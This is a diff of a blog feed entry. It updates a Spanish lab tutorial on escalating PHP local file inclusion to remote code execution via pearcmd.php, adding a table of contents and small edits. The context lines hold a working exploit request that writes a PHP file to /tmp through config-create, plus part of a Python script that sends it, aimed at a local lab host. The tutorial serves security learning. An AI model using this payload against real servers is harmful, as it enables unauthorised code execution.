@@ -17,6 +17,16 @@
 			<guid>https://maxibelino.github.io/es/posts/phplfitorce/</guid>
 			<description><![CDATA[LFI to RCE = Local File Inclusion to Remote Command Execution. Based on John Hammond Youtube video.]]></description>
 			<content type="html"><![CDATA[<p><em>John Hammond YouTube video <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></em></p>
+<ul>
+<li><a href="/es/posts/phplfitorce/#1-objetivo">1. Objetivo</a></li>
+<li><a href="/es/posts/phplfitorce/#2-creando-nuestro-laboratorio-local">2. Creando nuestro Laboratorio Local</a></li>
+<li><a href="/es/posts/phplfitorce/#3-variables-argc-y-argv">3. Variables argc y argv</a></li>
+<li><a href="/es/posts/phplfitorce/#4-acerca-del-archivo-pearcmdphp">4. Acerca del archivo pearcmd.php</a></li>
+<li><a href="/es/posts/phplfitorce/#5-ejecución-de-pearcmdphp">5. Ejecución de pearcmd.php</a></li>
+<li><a href="/es/posts/phplfitorce/#6-hacer-un-archivo-de-prueba-php-sin-usar-config-create-que-nos-dé-ejecución-de-comandos">6. Hacer un archivo de prueba .php (sin usar config-create) que nos dé ejecución de comandos</a></li>
+<li><a href="/es/posts/phplfitorce/#7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi">7. Repetimos y creamos el archivo ahora haciendo uso del LFI</a></li>
+<li><a href="/es/posts/phplfitorce/#8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)</a></li>
+</ul>
 <h2 id="1-objetivo">1. Objetivo</h2>
 <p>Vamos a probar como un LFI nos llevará a un RCE vía una vulnerabilidad de PHP.</p>
 <p>El problema existe hasta la versión PHP 7.3 y esto fue reportado en el año 2021.</p>
@@ -335,10 +345,11 @@ Vemos en la imagen anterior que recibimos una conexión entrante en el <em>liste
 <p><img src="../../../images/phplfitorce.es-43.png"></p>
 <p>Ya dentro del contenedor podemos realizar el análisis que queramos.</p>
 <p><img src="../../../images/phplfitorce.es-44.png"></p>
-<h2 id="8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un <em>script python</em> (en vez de <em>curl</em>) para crear el archivo (<em>.php</em>)</h2>
+<h2 id="8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)</h2>
 <p>La idea es crear un script en Python (<em>hack.py</em>) para hacer el GET request y así crear el archivo de extensión <em>.php</em> (al que luego podremos llamar mediante el LFI).</p>
 <p>Tomaremos el código sugerido en el blog y le consultamos a Chat GPT cómo hacer el <em>request</em> en Python:</p>
 <p><img src="../../../images/phplfitorce.es-45.png"></p>
+<p>Aquí el código por si lo quieres copiar:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/&lt;?<span class="o">=</span>phpinfo<span class="o">()</span>?&gt;+/tmp/hello.php HTTP/1.1
 </span></span><span class="line"><span class="cl">Host: 192.168.1.162:8080
 </span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
@@ -360,7 +371,7 @@ Vemos en la imagen anterior que recibimos una conexión entrante en el <em>liste
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
-</span></span></code></pre></div><p>→ este código será modificado</p>
+</span></span></code></pre></div><p>→ este código sugerido será modificado.</p>
 <p>Nos hacemos el archivo <em>hack.py</em> con el código sugerido por ChatGPT para ejecutar el GET <em>request</em> con python:</p>
 <p><img src="../../../images/phplfitorce.es-47.png"></p>
 <p>PERO: en vez de escribir la cadena <em>phpinfo()</em> en el <em>/tmp/hello.php</em></p>
